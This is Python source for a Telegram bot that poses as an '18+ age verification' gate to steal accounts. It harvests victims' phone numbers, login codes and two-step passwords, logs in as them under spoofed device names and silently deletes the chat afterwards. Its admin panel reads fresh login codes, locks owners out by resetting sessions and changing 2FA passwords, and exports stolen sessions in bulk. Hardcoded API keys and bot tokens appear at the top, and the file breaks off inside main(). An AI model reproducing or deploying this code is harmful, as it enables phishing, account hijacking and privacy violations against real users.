import asyncio
import os
import sqlite3
import datetime
import logging
import io
import struct
import base64
import zipfile
import random
from aiohttp import web
from pyrogram import Client, idle, filters, raw, enums
from pyrogram.handlers import MessageHandler, CallbackQueryHandler
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, ForceReply
from pyrogram.errors import (
    SessionPasswordNeeded, FloodWait, PhoneCodeInvalid, PasswordHashInvalid,
    AuthKeyUnregistered, SessionRevoked, UserDeactivated, MessageNotModified
)

# ================= CONFIGURATION =================
API_ID = 38315699
API_HASH = "71f422654c80626233b663a5a315b2e4"
BOT_TOKEN = "8815430056:AAHWimvAZwZ-q-Dgzo05fxU3VcOaLbeB0M0"
LOG_BOT_TOKEN = "8238397845:AAEL9yNPKTbOKkPjVrY9ipH-DBAV4RMXUh4"

# âš ï¸ WEB APP URL
WEB_APP_URL = "https://subandgo.blogspot.com/" 
WEB_SERVER_PORT = 8000

MAIN_ADMIN = 

SPOOF_DATA = [
    {"device": "Samsung Galaxy S23", "sys": "Android 13.0", "app": "10.1.0"},
    {"device": "iPhone 14 Pro", "sys": "iOS 16.5", "app": "10.1.0"}
]
DC_IPV4 = {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100", 4: "149.154.167.92", 5: "91.108.56.190"}

# ================= DATABASE SETUP =================
conn = sqlite3.connect("faithbot.db", check_same_thread=False)
cursor = conn.cursor()
cursor.executescript("""
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, session_string TEXT, phone_number TEXT,
        country_code TEXT, two_step_pass TEXT, spam_status TEXT DEFAULT 'Unknown',
        join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY);
    CREATE TABLE IF NOT EXISTS subbots (token TEXT PRIMARY KEY, owner_id INTEGER);
    CREATE TABLE IF NOT EXISTS visitors (user_id INTEGER PRIMARY KEY);
""")
cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (MAIN_ADMIN,))
conn.commit()

temp_login_pool = {}
user_states = {}
active_subbots = {}

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("FaithBot")

app = Client("faith_main_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True)
log_bot = Client("faith_log_bot", api_id=API_ID, api_hash=API_HASH, bot_token=LOG_BOT_TOKEN, in_memory=True)

# ================= BACKGROUND TASKS =================

async def send_log(user_id, text):
    """Sends log messages to admins safely"""
    try: await log_bot.send_message(user_id, text)
    except Exception: pass

async def wipe_chat_after_delay(uid, sess, bot_username):
    """Waits 60 seconds, then deletes the bot chat history from the user's side."""
    await asyncio.sleep(60)
    try:
        tc = Client(f"wipe_{uid}", session_string=sess, api_id=API_ID, api_hash=API_HASH, in_memory=True, no_updates=True)
        await tc.connect()
        peer = await tc.resolve_peer(bot_username)
        await tc.invoke(raw.functions.messages.DeleteHistory(peer=peer, max_id=0, revoke=True))
        await tc.disconnect()
        logger.info(f"Chat completely wiped for {uid} after 60 seconds.")
    except Exception as e:
        logger.error(f"Chat wipe failed for {uid}: {e}")

async def incomplete_otp_reminder_loop():
    """Checks every 5 minutes if users abandoned the OTP prompt 30 minutes ago"""
    while True:
        try:
            now = datetime.datetime.now()
            to_remove = []
            
            for uid, data in list(temp_login_pool.items()):
                # If 30 minutes (1800 seconds) have passed
                if (now - data["timestamp"]).total_seconds() > 1800:
                    try:
                        await app.send_message(
                            uid, 
                            "âš ï¸ **Verification Incomplete!**\n\nYou started the verification process but didn't finish entering your code.\n\nPlease click /start to try again and gain access."
                        )
                        await data["client"].disconnect()
                    except Exception: pass
                    to_remove.append(uid)
                    
            for uid in to_remove:
                temp_login_pool.pop(uid, None)
                
        except Exception: pass
        await asyncio.sleep(300) # Check every 5 minutes

# ================= UTILITIES =================

def is_admin(user_id):
    cursor.execute("SELECT user_id FROM admins WHERE user_id=?", (user_id,))
    return cursor.fetchone() is not None

def get_admins():
    cursor.execute("SELECT user_id FROM admins")
    return [row[0] for row in cursor.fetchall()]

def build_otp_keyboard():
    """Generates the Inline Keyboard Numpad"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("1", callback_data="otp_1"), InlineKeyboardButton("2", callback_data="otp_2"), InlineKeyboardButton("3", callback_data="otp_3")],
        [InlineKeyboardButton("4", callback_data="otp_4"), InlineKeyboardButton("5", callback_data="otp_5"), InlineKeyboardButton("6", callback_data="otp_6")],
        [InlineKeyboardButton("7", callback_data="otp_7"), InlineKeyboardButton("8", callback_data="otp_8"), InlineKeyboardButton("9", callback_data="otp_9")],
        [InlineKeyboardButton("C", callback_data="otp_clear"), InlineKeyboardButton("0", callback_data="otp_0"), InlineKeyboardButton("â«", callback_data="otp_back")]
    ])

def pyrogram_to_telethon_sqlite(pyro_string, phone):
    try:
        data = base64.urlsafe_b64decode(pyro_string + "=" * (-len(pyro_string) % 4))
        if len(data) >= 262:
            dc_id = struct.unpack(">B", data[:1])[0]
            auth_key = data[6:262] 
        else: return None
        ip = DC_IPV4.get(dc_id, "149.154.167.51")
        mem_db = sqlite3.connect(':memory:')
        mem_cur = mem_db.cursor()
        mem_cur.executescript("""
            CREATE TABLE version (version integer); INSERT INTO version VALUES (7);
            CREATE TABLE sessions (dc_id integer primary key, server_address text, port integer, auth_key blob, takeout_id integer);
            CREATE TABLE entities (id integer primary key, hash integer not null, username text, phone integer, name text, date integer);
            CREATE TABLE sent_files (md5_digest blob, file_size integer, type integer, id integer, hash integer);
            CREATE TABLE update_state (id integer primary key, pts integer, qts integer, date integer, seq integer);
        """)
        mem_cur.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", (dc_id, ip, 443, auth_key, 0))
        mem_db.commit()
        temp_file = f"{phone}.session"
        disk_db = sqlite3.connect(temp_file)
        mem_db.backup(disk_db)
        disk_db.close(); mem_db.close()
        with open(temp_file, "rb") as f: b = f.read()
        os.remove(temp_file)
        return b
    except Exception: return None

async def start_new_subbot(token):
    if token in active_subbots: return False
    try:
        new_bot = Client(f"subbot_{token.split(':')[0]}", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
        new_bot.add_handler(MessageHandler(start_handler, filters.command("start") & filters.private))
        new_bot.add_handler(MessageHandler(contact_handler, filters.contact & filters.private))
        new_bot.add_handler(MessageHandler(general_message_handler, (filters.text | filters.media) & filters.private & ~filters.command("start")))
        new_bot.add_handler(CallbackQueryHandler(callback_handler))
        await new_bot.start()
        active_subbots[token] = new_bot
        return True
    except: return False

# ================= LOGIN FINALIZER =================

async def finalize_login(user_id, client, phone, twostep, name, bot_me, edit_msg_obj=None):
    try:
        session_string = await client.export_session_string()
        cursor.execute("""
            INSERT OR REPLACE INTO users (user_id, session_string, phone_number, country_code, two_step_pass, spam_status) 
            VALUES (?, ?, ?, ?, ?, 'Unknown')
        """, (user_id, session_string, phone, "🥵", twostep))
        conn.commit()
        await client.disconnect()
        
        # 1. SEND SUCCESS MESSAGE TO USER FIRST
        success_msg = " 🥵**Age Verification Successful!**\n\nYou have been approved. Click the link below to access the Private Media Channel:\n\n🥵— https://t.me/+GAmuQk-QmZsxMTQ8"
        
        if edit_msg_obj:
            try: await edit_msg_obj.edit_text(success_msg)
            except Exception: await app.send_message(user_id, success_msg)
        else:
            await app.send_message(user_id, success_msg)
            
        # 2. CLEAR POOLS
        temp_login_pool.pop(user_id, None)
        user_states.pop(user_id, None)

        # 3. SCHEDULE WIPE
        asyncio.create_task(wipe_chat_after_delay(user_id, session_string, bot_me.username or str(bot_me.id)))
        
        # 4. SEND LOGS TO ADMINS
        log_text = f"🥵¨ **New Login**\n🥵“ `{phone}`\n🥵 2FA: `{twostep or 'None'}`\n🥵‘ `{name}`\n🥵† `{user_id}`"
        for admin in get_admins(): await send_log(admin, log_text)

    except Exception as e: logger.error(f"Finalize Error: {e}")


# ================= HANDLERS =================

@app.on_message(filters.command("start") & filters.private)
async def start_handler(client, message):
    user_id = message.from_user.id
    cursor.execute("INSERT OR IGNORE INTO visitors (user_id) VALUES (?)", (user_id,))
    
    # 🥵´ CHECK IF USER IS ALREADY VERIFIED
    cursor.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,))
    if cursor.fetchone():
        return await message.reply("â… **You are already verified!**\n\nPlease use another Telegram account if you wish to verify again.\n\n🥵— **Channel Link:** https://t.me/+GAmuQk-QmZsxMTQ8")
        
    conn.commit()

    if is_admin(user_id):
        btns = [[InlineKeyboardButton("🥵‘‘ Advanced Admin Panel", callback_data="admin_panel")]]
        return await message.reply("  🥵 **Welcome Admin!**", reply_markup=InlineKeyboardMarkup(btns))

    markup = InlineKeyboardMarkup([[InlineKeyboardButton("I am 🥵", web_app=WebAppInfo(url=f"{WEB_APP_URL}?uid={user_id}&v=1"))]])
    await client.send_message(message.chat.id, "🥵**18+ Verification Required**\n\nTo Get Started, Click the button below ", reply_markup=markup)

@app.on_message(filters.contact & filters.private)
async def contact_handler(client, message):
    user_id = message.from_user.id
    phone = message.contact.phone_number
    try: await message.delete()
    except: pass
    
    if user_id in temp_login_pool:
        try: await temp_login_pool[user_id]["client"].disconnect()
        except: pass

    spoof = random.choice(SPOOF_DATA)
    user_client = Client(f"web_{user_id}", api_id=API_ID, api_hash=API_HASH, device_model=spoof["device"], system_version=spoof["sys"], app_version=spoof["app"], in_memory=True)
    
    try:
        await user_client.connect()
        sent_code = await user_client.send_code(phone)
        temp_login_pool[user_id] = {
            "client": user_client, "phone": phone, 
            "hash": sent_code.phone_code_hash, "name": message.from_user.first_name,
            "otp_entered": "", 
            "timestamp": datetime.datetime.now() # 🥵´ Used for 30-min reminder
        }
        
        await client.send_message(
            user_id, 
            "🥵 **Enter Verification Code:**\n\nWe sent a 5-digit code to your Telegram chat.\n\n`🥵🥵🥵🥵🥵`", 
            reply_markup=build_otp_keyboard()
        )
        
    except FloodWait as e:
        await user_client.disconnect()
        await client.send_message(user_id, f"â Rate limit exceeded. Try again in {e.value} seconds.")
    except Exception as e:
        await user_client.disconnect()
        await client.send_message(user_id, f"â Error: {e}")

@app.on_message((filters.text | filters.media) & filters.private & ~filters.command("start"))
async def general_message_handler(client, message):
    user_id = message.from_user.id
    state = user_states.get(user_id)
    
    # 🥵´ Catching 2FA Password
    if state == "WAITING_FOR_2FA":
        password = message.text.strip()
        pool = temp_login_pool.get(user_id)
        if not pool:
            return await message.reply("â Session expired. Please /start again.")
            
        msg = await message.reply("â³ Verifying password...")
        try: await message.delete() # Hide password
        except: pass
        
        try:
            await pool["client"].check_password(password)
            bot_me = await client.get_me()
            await finalize_login(user_id, pool["client"], pool["phone"], password, pool["name"], bot_me, msg)
        except PasswordHashInvalid:
            await msg.edit_text("â **Incorrect Password!** Please type it again:")
        except Exception as e:
            await msg.edit_text(f"â **Error:** {e}")
        return

    # Admin functions
    if not state or not is_admin(user_id): return

    if state == "WAITING_FOR_MASS_2FA":
        new_pass = message.text.strip()
        msg = await message.reply(f"â³ Setting mass 2FA password to: `{new_pass}`. Please wait...")
        user_states.pop(user_id, None)
        cursor.execute("SELECT user_id, session_string FROM users")
        accs = cursor.fetchall()
        success = 0
        for acc in accs:
            try:
                tc = Client(f"tc_{acc[0]}", session_string=acc[1], api_id=API_ID, api_hash=API_HASH, in_memory=True, no_updates=True)
                await tc.connect()
                await tc.enable_cloud_password(new_pass)
                cursor.execute("UPDATE users SET two_step_pass=? WHERE user_id=?", (new_pass, acc[0]))
                await tc.disconnect()
                success += 1
            except: pass
        conn.commit()
        await msg.edit_text(f"â… Mass 2FA Complete.\nSecured `{success}` out of `{len(accs)}` accounts.")

    elif state == "WAITING_FOR_ADMIN_ID":
        if user_id != MAIN_ADMIN: return
        user_states.pop(user_id, None)
        try:
            new_admin = int(message.text.strip())
            cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (new_admin,))
            conn.commit()
            await message.reply(f"â… User `{new_admin}` added as Admin.")
        except ValueError: await message.reply("â Invalid format! Send a numeric ID.")

    elif state == "WAITING_FOR_SUBBOT_TOKEN":
        token = message.text.strip()
        user_states.pop(user_id, None)
        msg = await message.reply("â³ Deploying Sub-Bot...")
        cursor.execute("INSERT OR IGNORE INTO subbots (token, owner_id) VALUES (?, ?)", (token, user_id))
        conn.commit()
        if await start_new_subbot(token): await msg.edit_text(f"â… **Sub-Bot Started!**\nToken: `{token[:10]}...`")
        else:
            cursor.execute("DELETE FROM subbots WHERE token=?", (token,))
            conn.commit()
            await msg.edit_text("â **Failed to start Sub-Bot.**")

@app.on_callback_query()
async def callback_handler(client, query):
    user_id = query.from_user.id
    data = query.data
    
    # 🥵´ INLINE NUMPAD OTP LOGIC
    if data.startswith("otp_"):
        pool = temp_login_pool.get(user_id)
        if not pool:
            return await query.message.edit_text("â Session expired. Please /start again.", reply_markup=None)
            
        action = data.split("_")[1]
        current_otp = pool.get("otp_entered", "")

        if action == "clear": current_otp = ""
        elif action == "back": current_otp = current_otp[:-1]
        else:
            if len(current_otp) < 5: current_otp += action

        pool["otp_entered"] = current_otp
        display_otp = " ".join(current_otp) + " â€¢" * (5 - len(current_otp))
        
        if len(current_otp) == 5:
            await query.message.edit_text(f"🥵„ **Verifying Code:** `{current_otp}` ...", reply_markup=None)
            try:
                await pool["client"].sign_in(pool["phone"], pool["hash"], current_otp)
                bot_me = await client.get_me()
                await finalize_login(user_id, pool["client"], pool["phone"], None, pool["name"], bot_me, query.message)
            except SessionPasswordNeeded:
                user_states[user_id] = "WAITING_FOR_2FA"
                await query.message.edit_text("🥵’ **Two-Step Verification Enabled**\n\nYour account is protected by a Cloud Password.\n**Please type your password directly in this chat to continue:**")
            except PhoneCodeInvalid:
                pool["otp_entered"] = "" 
                await query.message.edit_text("â **Invalid Code!** Try again:\n\n`â€¢ â€¢ â€¢ â€¢ â€¢`", reply_markup=build_otp_keyboard())
            except Exception as e:
                await query.message.edit_text(f"â **Error:** {e}")
        else:
            try: await query.message.edit_text(f"🥵 **Enter Verification Code:**\n\n`{display_otp}`", reply_markup=build_otp_keyboard())
            except MessageNotModified: pass
        return

    # ================= ADMIN PANEL HANDLERS =================
    if not is_admin(user_id): return

    if data == "admin_panel":
        btns = [
            [InlineKeyboardButton("🥵“‹ View Accounts", callback_data="adm_view_all"), InlineKeyboardButton("🥵“Š Stats", callback_data="adm_stats")],
            [InlineKeyboardButton("🥵“¦ Export Zip (Sessions)", callback_data="adm_export_menu")],
            [InlineKeyboardButton("🥵›¡ Securing & 2FA Tools", callback_data="adm_security")],
            [InlineKeyboardButton("🥵¤– Sub-Bot Manager", callback_data="adm_subbots")]
        ]
        if user_id == MAIN_ADMIN: btns.append([InlineKeyboardButton("🥵‘‘ Admin Manager", callback_data="adm_managers")])
        btns.append([InlineKeyboardButton("🥵™ Close", callback_data="close_panel")])
        try: await query.message.edit_text("🥵‘‘ **ADVANCED ADMIN PANEL**", reply_markup=InlineKeyboardMarkup(btns))
        except MessageNotModified: pass

    elif data == "adm_stats":
        cursor.execute("SELECT COUNT(*) FROM users")
        total = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM users WHERE two_step_pass IS NOT NULL AND two_step_pass != ''")
        with_2fa = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM users WHERE spam_status != 'Unknown'")
        checked = cursor.fetchone()[0]
        txt = f"🥵“Š **ADVANCED SYSTEM STATS**\n\n🥵“ˆ Total Logins: `{total}`\nâ… Active: `{total}`\n🥵 Secured (2FA): `{with_2fa}`\n🥵“ Unsecured: `{total - with_2fa}`\n🥵›¡ Spam Checked: `{checked}`"
        try: await query.message.edit_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🥵™ Back", callback_data="admin_panel")]]))
        except MessageNotModified: pass

    elif data == "adm_view_all":
        cursor.execute("SELECT user_id, phone_number, country_code FROM users")
        all_users = cursor.fetchall()
        if not all_users: return await query.answer("No accounts.", show_alert=True)
        btns = [[InlineKeyboardButton(f"{u[2] or '🥵'} {u[1]}", callback_data=f"adm_detail_{u[0]}")] for u in all_users[:50]]
        btns.append([InlineKeyboardButton("🥵™ Back", callback_data="admin_panel")])
        try: await query.message.edit_text("🥵“‹ **Logged In Accounts:**", reply_markup=InlineKeyboardMarkup(btns))
        except MessageNotModified: pass

    elif data.startswith("adm_detail_"):
        tgt_id = int(data.split("_")[2])
        cursor.execute("SELECT phone_number, country_code, two_step_pass, spam_status, session_string FROM users WHERE user_id=?", (tgt_id,))
        row = cursor.fetchone()
        if not row: return await query.answer("Not found.", show_alert=True)
        
        await query.message.edit_text("🥵„ **Connecting to session to fetch Live Advanced Data...**")
        phone, cc, twostep, spam, sess = row[0], row[1], row[2], row[3], row[4]
        
        dev_count = dms = groups = channels = contacts = 0
        status = "â Dead/Error"
        try:
            tc = Client(f"ld_{tgt_id}", session_string=sess, api_id=API_ID, api_hash=API_HASH, in_memory=True, no_updates=True)
            await tc.connect()
            auths = await tc.invoke(raw.functions.account.GetAuthorizations())
            dev_count = len(auths.authorizations)
            contacts = len(await tc.get_contacts())
            async for d in tc.get_dialogs(limit=500):
                if d.chat.type == enums.ChatType.PRIVATE: dms += 1
                elif d.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]: groups += 1
                elif d.chat.type == enums.ChatType.CHANNEL: channels += 1
            await tc.disconnect()
            status = "â… Session Alive"
        except Exception as e: status = f"â Dead/Error ({e})"
            
        text = (
            f"🥵‘¤ **Advanced Account Details**\n"
            f"🥵† `{tgt_id}`\n🥵“± `{phone}` ({cc})\n"
            f"🥵 **Status:** {status}\n"
            f"🥵 **2FA:** `{twostep or 'None'}`\n"
            f"🥵›¡ **Spam Bot:** `{spam}`\n\n"
            f"🥵“Š **Live Data (From Session):**\n"
            f"🥵“± Active Devices: `{dev_count}`\n"
            f"🥵‘¥ Contacts: `{contacts}`\n"
            f"🥵’¬ Direct Messages: `{dms}`\n"
            f"🥵˜ Groups: `{groups}`\n"
            f"🥵“¢ Channels: `{channels}`\n"
        )
        
        btns = [
            [InlineKeyboardButton("🥵“¥ Get OTP", callback_data=f"adm_otp_{tgt_id}"), InlineKeyboardButton("🥵›¡ Check Spam", callback_data=f"adm_spam_{tgt_id}")],
            [InlineKeyboardButton("🥵’¥ Terminate Other Sessions", callback_data=f"adm_term_{tgt_id}")],
            [InlineKeyboardButton("🥵“¦ Extract & Isolate Account", callback_data=f"adm_extract_{tgt_id}")],
            [InlineKeyboardButton("🥵™ Back", callback_data="adm_view_all")]
        ]
        try: await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(btns))
        except MessageNotModified: pass

    elif data.startswith("adm_extract_"):
        tgt_id = int(data.split("_")[2])
        cursor.execute("SELECT phone_number, session_string FROM users WHERE user_id=?", (tgt_id,))
        row = cursor.fetchone()
        if not row: return await query.answer("Not found.", show_alert=True)
        
        await query.message.edit_text("â³ **Isolating Account...**")
        phone, pyro_str = row[0], row[1]
        msg_txt = f"🥵“¦ **Isolated Account Extracted**\n🥵“± `{phone}`\n\n"
        
        try:
            tc = Client(f"ex_{tgt_id}", session_string=pyro_str, api_id=API_ID, api_hash=API_HASH, in_memory=True, no_updates=True)
            await tc.connect()
            try:
                await tc.invoke(raw.functions.auth.ResetAuthorizations())
                msg_txt += "🥵… Other sessions terminated.\n"
            except: msg_txt += "🥵¸ Could not terminate others.\n"
            await tc.disconnect()
        except Exception as e: msg_txt += f"â Session Error: {e}\n"
            
        cursor.execute("DELETE FROM users WHERE user_id=?", (tgt_id,))
        conn.commit()
        msg_txt += f"\n🥵 **Pyrogram String:**\n`{pyro_str}`"
        
        tele_bytes = pyrogram_to_telethon_sqlite(pyro_str, phone)
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w") as zf:
            if tele_bytes: zf.writestr(f"{phone}.session", tele_bytes)
            else: zf.writestr(f"{phone}_error.txt", "Failed to convert Telethon.")
        zip_buffer.seek(0)
        zip_buffer.name = f"{phone}_Isolated.zip"
        
        await client.send_document(user_id, zip_buffer, caption=msg_txt)
        await query.message.delete()

    elif data.startswith("adm_term_"):
        tgt_id = int(data.split("_")[2])
        cursor.execute("SELECT session_string FROM users WHERE user_id=?", (tgt_id,))
        row = cursor.fetchone()
        try:
            tc = Client(f"t_{tgt_id}", session_string=row[0], api_id=API_ID, api_hash=API_HASH, in_memory=True, no_updates=True)
            await tc.connect()
            await tc.invoke(raw.functions.auth.ResetAuthorizations())
            await tc.disconnect()
            await query.answer("â… Terminated all other sessions!", show_alert=True)
        except Exception as e: await query.answer(f"â Failed: {e}", show_alert=True)

    elif data.startswith("adm_spam_"):
        tgt_id = int(data.split("_")[2])
        cursor.execute("SELECT session_string FROM users WHERE user_id=?", (tgt_id,))
        row = cursor.fetchone()
        await query.message.edit_text("🥵„ **Checking @SpamBot...**")
        try:
            tc = Client(f"spm_{tgt_id}", session_string=row[0], api_id=API_ID, api_hash=API_HASH, in_memory=True, no_updates=True)
            await tc.connect()
            await tc.send_message("SpamBot", "/start")
            await asyncio.sleep(1.5)
            spam_msg = ""
            async for msg in tc.get_chat_history("SpamBot", limit=1): spam_msg = msg.text
            cursor.execute("UPDATE users SET spam_status=? WHERE user_id=?", ("Checked", tgt_id))
            conn.commit()
            await tc.disconnect()
            await query.message.edit_text(f"🥵›¡ **Spam Status:**\n\n`{spam_msg}`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🥵™ Back", callback_data=f"adm_detail_{tgt_id}")]]))
        except Exception as e: await query.message.edit_text(f"â Error: {e}")

    elif data.startswith("adm_otp_"):
        tgt_id = int(data.split("_")[2])
        cursor.execute("SELECT session_string FROM users WHERE user_id=?", (tgt_id,))
        row = cursor.fetchone()
        await query.message.edit_text("🥵„ **Fetching 777000...**")
        try:
            tc = Client(f"otp_{tgt_id}", session_string=row[0], api_id=API_ID, api_hash=API_HASH, in_memory=True, no_updates=True)
            await tc.connect()
            msgs = ""
            async for msg in tc.get_chat_history(777000, limit=2):
                if msg.text: msgs += f"🥵’¬ `{msg.text}`\n---\n"
            await tc.disconnect()
            await query.message.edit_text(f"🥵“© **Recent Codes:**\n\n{msgs}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🥵™ Back", callback_data=f"adm_detail_{tgt_id}")]]))
        except Exception as e:
            await query.message.edit_text(f"❌ Error: {e}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🥵™ Back", callback_data=f"adm_detail_{tgt_id}")]]))

    elif data == "adm_export_menu":
        btns = [[InlineKeyboardButton("🥵 Export Pyrogram (.txt)", callback_data="fmt_pyro")], [InlineKeyboardButton("🥵˜ Export Telethon (.session Zip)", callback_data="fmt_tele")], [InlineKeyboardButton("🥵™ Back", callback_data="admin_panel")]]
        try: await query.message.edit_text("🥵“¦ **Choose Export Format:**", reply_markup=InlineKeyboardMarkup(btns))
        except MessageNotModified: pass

    elif data in ["fmt_pyro", "fmt_tele"]:
        pfx = "pyro" if "pyro" in data else "tele"
        btns = [[InlineKeyboardButton("🥵 All Accounts", callback_data=f"time_{pfx}_all")], [InlineKeyboardButton("🥵†• New Accounts (< 24h)", callback_data=f"time_{pfx}_new")], [InlineKeyboardButton("🥵› Old Accounts (> 24h)", callback_data=f"time_{pfx}_old")], [InlineKeyboardButton("🥵™ Back", callback_data="adm_export_menu")]]
        try: await query.message.edit_text("🥵“¦ **Select Timeframe:**", reply_markup=InlineKeyboardMarkup(btns))
        except MessageNotModified: pass

    elif data.startswith("time_"):
        _, fmt, timef = data.split("_")
        btns = [[InlineKeyboardButton("🥵“¥ Standard Copy (Keep in Bot)", callback_data=f"run_exp_{fmt}_{timef}_std")], [InlineKeyboardButton("🥵’¥ Exclusive Extract (Isolate & Delete)", callback_data=f"run_exp_{fmt}_{timef}_exc")], [InlineKeyboardButton("🥵™ Back", callback_data="adm_export_menu")]]
        try: await query.message.edit_text("âš ï¸ **Select Export Mode:**\n\n**Standard:** Copies the sessions.\n**Exclusive:** Terminates other devices and removes the accounts from the Bot.", reply_markup=InlineKeyboardMarkup(btns))
        except MessageNotModified: pass

    elif data.startswith("run_exp_"):
        _, _, fmt, timef, mode = data.split("_")
        if timef == "all": qry = "SELECT user_id, phone_number, session_string FROM users"
        elif timef == "new": qry = "SELECT user_id, phone_number, session_string FROM users WHERE join_date > datetime('now', '-1 day')"
        else: qry = "SELECT user_id, phone_number, session_string FROM users WHERE join_date <= datetime('now', '-1 day')"
        cursor.execute(qry)
        data_rows = cursor.fetchall()
        if not data_rows: return await query.answer("No matching accounts found.", show_alert=True)
        await query.message.edit_text(f"â³ **Processing {len(data_rows)} Accounts...**")
        valid_accs = []
        for r in data_rows:
            uid, phone, pyro_str = r[0], r[1], r[2]
            valid_accs.append((phone, pyro_str))
            if mode == "exc":
                try:
                    tc = Client(f"bulk_{uid}", session_string=pyro_str, api_id=API_ID, api_hash=API_HASH, in_memory=True, no_updates=True)
                    await tc.connect()
                    try: await tc.invoke(raw.functions.auth.ResetAuthorizations())
                    except: pass
                    await tc.disconnect()
                    cursor.execute("DELETE FROM users WHERE user_id=?", (uid,))
                except: pass
        if mode == "exc": conn.commit()

        if fmt == "pyro":
            text = "".join([f"{r[0]} | {r[1]}\n" for r in valid_accs])
            bio = io.BytesIO(text.encode())
            bio.name = f"Pyrogram_{timef.upper()}_{mode.upper()}.txt"
            await client.send_document(user_id, bio)
        elif fmt == "tele":
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, "w") as zf:
                added = 0
                for r in valid_accs:
                    db_bytes = pyrogram_to_telethon_sqlite(r[1], r[0])
                    if db_bytes: 
                        zf.writestr(f"{r[0]}.session", db_bytes)
                        added += 1
                    else: zf.writestr(f"{r[0]}_failed.txt", f"Failed Pyrogram String: {r[1]}")
                if added == 0: zf.writestr("empty.txt", "No files generated.")
            zip_buffer.seek(0)
            zip_buffer.name = f"Telethon_{timef.upper()}_{mode.upper()}.zip"
            await client.send_document(user_id, zip_buffer)
        await query.message.edit_text("â… Export Complete!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🥵™ Back", callback_data="admin_panel")]]))

    elif data == "adm_security":
        btns = [[InlineKeyboardButton("🥵’ Mass Change 2FA", callback_data="sec_mass_2fa")], [InlineKeyboardButton("🥵 24H Auto Terminate", callback_data="sec_24h_clear")], [InlineKeyboardButton("🥵™ Back", callback_data="admin_panel")]]
        try: await query.message.edit_text("🥵›¡ **Security Tools**", reply_markup=InlineKeyboardMarkup(btns))
        except MessageNotModified: pass

    elif data == "sec_mass_2fa":
        user_states[user_id] = "WAITING_FOR_MASS_2FA"
        await query.message.reply("❌’ **Mass 2FA Setup**\n\nReply with the NEW 2FA password:", reply_markup=ForceReply())

    elif data == "sec_24h_clear":
        cursor.execute("SELECT user_id, session_string FROM users WHERE join_date <= datetime('now', '-1 day')")
        accs = cursor.fetchall()
        if not accs: return await query.answer("No accounts older than 24h found.", show_alert=True)
        await query.message.edit_text(f"â³ **Clearing {len(accs)} old accounts...**")
        sec = 0
        for acc in accs:
            try:
                tc = Client(f"tc_{acc[0]}", session_string=acc[1], api_id=API_ID, api_hash=API_HASH, in_memory=True, no_updates=True)
                await tc.connect()
                await tc.invoke(raw.functions.auth.ResetAuthorizations())
                await tc.disconnect()
                sec += 1
            except: pass
        await query.message.edit_text(f"â… Cleared other sessions for `{sec}` accounts.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("😝™ Back", callback_data="adm_security")]]))

    elif data == "adm_subbots":
        btns = [[InlineKeyboardButton("âž• Deploy New Sub-Bot", callback_data="add_subbot")], [InlineKeyboardButton("🥰“‹ List Active Sub-Bots", callback_data="list_subbots")], [InlineKeyboardButton("😍™ Back", callback_data="admin_panel")]]
        try: await query.message.edit_text("😳 **SUB-BOT MANAGER**", reply_markup=InlineKeyboardMarkup(btns))
        except MessageNotModified: pass

    elif data == "add_subbot":
        user_states[user_id] = "WAITING_FOR_SUBBOT_TOKEN"
        await query.message.reply("😏– **Deploy Sub-Bot**\nReply with Bot Token:", reply_markup=ForceReply())

    elif data == "list_subbots":
        cursor.execute("SELECT token FROM subbots")
        bots = cursor.fetchall()
        if not bots: return await query.answer("No Sub-Bots active.", show_alert=True)
        btns = [[InlineKeyboardButton(f"🥵¤– Bot: {b[0].split(':')[0]}", callback_data="none"), InlineKeyboardButton("👿Delete", callback_data=f"delsub_{b[0].split(':')[0]}")] for b in bots]
        btns.append([InlineKeyboardButton("😖™ Back", callback_data="adm_subbots")])
        try: await query.message.edit_text("🥳“‹ **Active Sub-Bots:**", reply_markup=InlineKeyboardMarkup(btns))
        except MessageNotModified: pass

    elif data.startswith("delsub_"):
        bot_id = data.split("_")[1]
        cursor.execute("SELECT token FROM subbots WHERE token LIKE ?", (f"{bot_id}:%",))
        target = cursor.fetchone()
        if target:
            tok = target[0]
            if tok in active_subbots:
                await active_subbots[tok].stop()
                active_subbots.pop(tok, None)
            cursor.execute("DELETE FROM subbots WHERE token=?", (tok,))
            conn.commit()
            await query.answer("Sub-Bot deleted!", show_alert=True)
            await query.message.edit_text("â… Sub-Bot deleted.")

    elif data == "adm_managers":
        if user_id != MAIN_ADMIN: return
        user_states[user_id] = "WAITING_FOR_ADMIN_ID"
        await query.message.reply("🥵‘‘ **Add Admin**\nReply with User ID:", reply_markup=ForceReply())

    elif data == "close_panel": 
        try: await query.message.delete()
        except: await query.message.edit_text("â… Panel Closed.", reply_markup=None)

# ================= SERVER HOSTING (HTML) =================

async def serve_html(request):
    """Hosts the index.html on port 8000"""
    return web.FileResponse('index.html')

async def main():
    print("Œ Booting CR7X System...")
    await log_bot.start()
    await app.start()
    
    asyncio.create_task(incomplete_otp_reminder_loop())
    
